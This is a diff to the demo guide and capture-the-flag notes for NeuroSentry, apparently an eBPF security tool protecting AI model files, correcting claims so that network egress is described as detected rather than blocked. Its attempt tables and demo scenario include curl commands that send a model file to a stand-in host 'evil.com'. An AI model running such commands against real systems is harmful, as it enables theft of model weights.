@@ -146,14 +146,16 @@ curl http://localhost:8080/leaderboard
 
 ### Expected Participant Attempts
 
-| Attempt | Expected Result | Why |
-|---------|-----------------|-----|
-| `cp /target/model.safetensors /tmp/` | EPERM | LSM `file_open` returns `-EPERM` |
-| `cat /target/model.safetensors > /tmp/` | EPERM | Same — `cat` calls `open(2)` first |
-| `dd if=/target/...` | EPERM | Same — `dd` calls `open(2)` first |
+| Attempt | Expected Result | Mechanism |
+|---------|-----------------|-----------|
+| `cp /target/model.safetensors /tmp/` | EPERM (blocked) | LSM `file_open` hook |
+| `cat /target/model.safetensors > /tmp/` | EPERM (blocked) | LSM `file_open` hook |
+| `dd if=/target/...` | EPERM (blocked) | LSM `file_open` hook |
 | `kill -9 $(pidof neurosentry)` | Auto-restart | Container restart policy |
-| `curl --data-binary @/target/... evil.com` | Logged, **not** blocked | TC/XDP are monitor-only in v1.0 — see Grafana flows panel for the captured event |
-| UDP exfil on port 53 | Logged, **not** blocked | Same — no XDP_DROP in shipped programs |
+| `curl --data-binary @/target/... evil.com` | Detected & alerted (not dropped) | TC egress monitor — the flow is logged and a finding is raised; packets are **not** blocked in v1.0 |
+| UDP exfil on port 53 | Detected & alerted (not dropped) | TC egress monitor — same monitor-only behavior |
+
+> **Accuracy note for presenters:** file access is truly *enforced* (`-EPERM` at the LSM `file_open` hook). The network layer (TC) is **monitor-only** in v1.0 — it observes and alerts on egress, it does not drop packets. XDP is not loaded. Don't claim network exfiltration is blocked; claim it is *detected and correlated*.
 
 ### Organizer Notes
 
@@ -193,9 +195,9 @@ unprecedented visibility and control over AI workloads."
 #### 2. Architecture Overview (3 minutes)
 
 Show the architecture diagram:
-- User space: Go agent, policy engine, metrics
-- Kernel space: LSM hooks, XDP programs, Uprobes
-- Data flow: Event → Ring buffer → Policy engine → Action
+- User space: Go agent, policy engine, cross-layer correlation, metrics
+- Kernel space: the eBPF triad — LSM `file_open` hook, TC ingress/egress, Uprobes (pickle/PyTorch)
+- Data flow: Event → ring buffer → correlation + policy engine → action / alert
 
 #### 3. Live Demonstration (8 minutes)
 
@@ -305,9 +307,15 @@ curl -X POST http://evil.com/steal --data-binary @/target/model.safetensors
 
 **Expected Output:**
 ```
-curl: (52) Empty reply from server
-# Connection blocked by XDP before reaching network stack
+# The transfer completes at the network layer — TC is monitor-only in v1.0.
+# NeuroSentry raises a correlated finding: a protected-model read (or a flagged
+# AI intent) followed by outbound egress to an external host.
 ```
+
+> The value shown here is **detection and cross-layer correlation**, not a
+> dropped packet. If the same process also read a protected model file, that
+> file read is what is truly blocked (LSM `-EPERM`); the egress attempt is
+> detected and alerted.
 
 ### Scenario 3: Container Escape Attempt
 
@@ -341,12 +349,14 @@ sudo ./start.sh
 sudo setcap cap_bpf+ep ./bin/neurosentry
 ```
 
-#### XDP attachment fails
+#### Network layer (TC) not attaching
 
-**Fix**: Check driver support:
+The network layer uses **TC** (traffic control), not XDP — it works on cloud
+NICs where XDP driver mode is unavailable. If TC ingress/egress fails to attach,
+confirm `network_containment.enabled: true` and that the interface exists:
 ```bash
-ethtool -k eth0 | grep generic-xdp
-# If not supported, use SKB mode instead
+ip -o link show          # find the interface name
+tc qdisc show dev eth0    # NeuroSentry adds a clsact qdisc when attached
 ```
 
 #### High CPU usage during demo
@@ -389,7 +399,7 @@ dd if=/dev/urandom of=/tmp/model.safetensors bs=1M count=1024  # 1GB
 - [Architecture Documentation](architecture.md)
 - [User Guide](user-guide.md)
 - [CTF Challenge README](../demos/capture-the-model/README.md)
-- [Demo Video](../demos/video/neurosentry-demo.mp4)
+- [Video Script](../demos/video-script.md)
 
 ---
 
